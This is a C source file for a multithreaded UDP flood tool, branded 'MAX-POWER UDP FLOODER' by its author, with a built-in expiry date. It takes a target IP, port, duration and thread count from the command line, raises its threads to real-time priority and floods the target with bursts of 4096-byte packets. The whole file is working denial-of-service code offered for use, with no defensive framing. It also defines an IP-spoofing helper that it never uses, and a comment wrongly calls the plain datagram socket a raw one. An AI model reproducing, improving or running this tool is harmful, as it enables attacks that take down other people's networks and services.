#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <time.h>
#include <sched.h>

#define EXPIRY_YEAR 2025
#define EXPIRY_MONTH 3
#define EXPIRY_DAY 20
#define PACKET_SIZE 4096  // Increased packet size for more impact
#define BURST_COUNT 10    // Number of packets sent per burst

// Attack parameters
char target_ip[20];
int target_port, attack_time, num_threads;

// Expiry function
void check_expiry() {
    time_t now = time(NULL);
    struct tm expiry_date = {.tm_year = EXPIRY_YEAR - 1900, .tm_mon = EXPIRY_MONTH - 1, .tm_mday = EXPIRY_DAY};

    if (difftime(now, mktime(&expiry_date)) > 0) {
        printf("[-] This script has expired. Contact @seedhe_maut for updates.\n");
        exit(EXIT_FAILURE);
    }
}

// Error handling
void handle_error(const char *message) {
    perror(message);
    exit(EXIT_FAILURE);
}

// Generates a random IP for IP spoofing
char *random_ip() {
    static char spoofed_ip[16];
    snprintf(spoofed_ip, sizeof(spoofed_ip), "%d.%d.%d.%d", 
             rand() % 255, rand() % 255, rand() % 255, rand() % 255);
    return spoofed_ip;
}

// UDP flood function
void *udp_flood(void *arg) {
    struct sockaddr_in victim;
    int sock;
    char packet[PACKET_SIZE];

    // Set target details
    memset(&victim, 0, sizeof(victim));
    victim.sin_family = AF_INET;
    victim.sin_port = htons(target_port);
    victim.sin_addr.s_addr = inet_addr(target_ip);

    // Create high-priority thread
    struct sched_param param;
    param.sched_priority = sched_get_priority_max(SCHED_RR);
    pthread_setschedparam(pthread_self(), SCHED_RR, &param);

    // Create RAW UDP socket
    sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) handle_error("Socket creation failed");

    int optval = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));

    printf("[+] Thread %ld attacking %s:%d\n", pthread_self(), target_ip, target_port);

    memset(packet, 'X', sizeof(packet));  // Increased payload density

    time_t start_time = time(NULL);
    while (time(NULL) - start_time < attack_time) {
        for (int i = 0; i < BURST_COUNT; i++) {
            if (sendto(sock, packet, sizeof(packet), 0, (struct sockaddr *)&victim, sizeof(victim)) < 0) {
                perror("Send failed");
            }
        }
    }

    close(sock);
    pthread_exit(NULL);
}

// Starts attack threads
void start_attack() {
    pthread_t threads[num_threads];

    for (int i = 0; i < num_threads; i++) {
        if (pthread_create(&threads[i], NULL, udp_flood, NULL) != 0) {
            handle_error("Thread creation failed");
        }
    }

    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }
}

// Main function
int main(int argc, char *argv[]) {
    printf("🔥 MAX-POWER UDP FLOODER 🔥\nMade and Owned by @seedhe_maut\n");

    check_expiry(); // Check expiry before execution

    if (argc != 5) {
        printf("Usage: %s <IP> <Port> <Time (seconds)> <Threads>\n", argv[0]);
        return EXIT_FAILURE;
    }

    // Get parameters from command line
    strncpy(target_ip, argv[1], sizeof(target_ip) - 1);
    target_port = atoi(argv[2]);
    attack_time = atoi(argv[3]);
    num_threads = atoi(argv[4]);

    printf("[*] Starting MAX-POWER UDP flood attack on %s:%d for %d seconds using %d threads...\n",
           target_ip, target_port, attack_time, num_threads);

    start_attack();

    printf("[*] Attack completed.\n");
    return EXIT_SUCCESS;
}
